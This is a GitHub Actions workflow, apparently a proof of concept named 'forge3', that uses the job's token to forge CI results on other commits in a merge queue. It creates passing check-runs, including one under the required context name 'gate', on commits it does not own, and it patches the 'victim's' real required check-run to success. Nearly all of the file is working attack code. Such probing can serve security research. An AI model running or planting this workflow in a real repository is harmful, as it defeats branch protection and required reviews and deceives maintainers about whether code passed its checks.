name: forge3
on:
  merge_group:
permissions:
  contents: read
  checks: write
  statuses: write
jobs:
  forge3:
    runs-on: ubuntu-latest
    steps:
      - name: D1/D2/D3 - the axis control, one token, one context
        run: |
          R="${{ github.repository }}"
          T="${{ github.token }}"
          SELF="${{ github.sha }}"
          echo "SELF-SHA=$SELF"
          curl -sS -H "Authorization: Bearer $T" \
            "https://api.github.com/repos/$R/git/matching-refs/heads/gh-readonly-queue" -o /tmp/refs.json
          jq -r '.[] | [.ref, .object.sha] | @tsv' /tmp/refs.json > /tmp/pairs.tsv
          cat /tmp/pairs.tsv
          while IFS=$'\t' read -r ref sha; do
            [ -z "$sha" ] && continue
            if [ "$sha" = "$SELF" ]; then echo "SKIP-SELF ref=$ref"; continue; fi
            echo "=== TARGET ref=$ref sha=$sha ==="

            # D1: can this job CREATE a check-run on a commit it does not own?
            d1=$(curl -sS -o /tmp/d1.json -w '%{http_code}' -X POST \
              -H "Authorization: Bearer $T" -H 'Accept: application/vnd.github+json' \
              "https://api.github.com/repos/$R/check-runs" \
              -d "{\"name\":\"atk-created\",\"head_sha\":\"$sha\",\"status\":\"completed\",\"conclusion\":\"success\"}")
            echo "D1-CREATE-OTHER-COMMIT http=$d1"
            jq -c '{id,name,status,conclusion,app:.app.slug,msg:.message}' /tmp/d1.json 2>/dev/null || cat /tmp/d1.json
            newid=$(jq -r '.id // empty' /tmp/d1.json)

            # D1b: create one using the REQUIRED context name
            d1b=$(curl -sS -o /tmp/d1b.json -w '%{http_code}' -X POST \
              -H "Authorization: Bearer $T" -H 'Accept: application/vnd.github+json' \
              "https://api.github.com/repos/$R/check-runs" \
              -d "{\"name\":\"gate\",\"head_sha\":\"$sha\",\"status\":\"completed\",\"conclusion\":\"success\"}")
            echo "D1b-CREATE-REQUIRED-CONTEXT http=$d1b"
            jq -c '{id,name,status,conclusion,msg:.message}' /tmp/d1b.json 2>/dev/null || cat /tmp/d1b.json

            # D2: can it PATCH the one it just created?
            if [ -n "$newid" ]; then
              d2=$(curl -sS -o /tmp/d2.json -w '%{http_code}' -X PATCH \
                -H "Authorization: Bearer $T" -H 'Accept: application/vnd.github+json' \
                "https://api.github.com/repos/$R/check-runs/$newid" \
                -d '{"status":"completed","conclusion":"success","output":{"title":"self-patch","summary":"self"}}')
              echo "D2-SELF-PATCH checkrun=$newid http=$d2"
              jq -c '{id,name,conclusion,msg:.message}' /tmp/d2.json 2>/dev/null || cat /tmp/d2.json
            else
              echo "D2-SELF-PATCH SKIPPED (D1 produced no id)"
            fi

            # D3: the Phase C cell - PATCH the VICTIM's real required check-run
            curl -sS -H "Authorization: Bearer $T" \
              "https://api.github.com/repos/$R/commits/$sha/check-runs" -o /tmp/cr.json
            jq -c '.check_runs[] | {id,name,status,conclusion,app:.app.slug,run:.check_suite.id}' /tmp/cr.json
            for id in $(jq -r --arg n "gate" '.check_runs[] | select(.name==$n) | .id' /tmp/cr.json); do
              d3=$(curl -sS -o /tmp/d3.json -w '%{http_code}' -X PATCH \
                -H "Authorization: Bearer $T" -H 'Accept: application/vnd.github+json' \
                "https://api.github.com/repos/$R/check-runs/$id" \
                -d '{"status":"completed","conclusion":"success","output":{"title":"rewritten","summary":"x"}}')
              echo "D3-PATCH-VICTIM-REAL checkrun=$id http=$d3"
              jq -c '{id,name,conclusion,msg:.message}' /tmp/d3.json 2>/dev/null || cat /tmp/d3.json
            done
          done < /tmp/pairs.tsv
          echo FORGE3-DONE
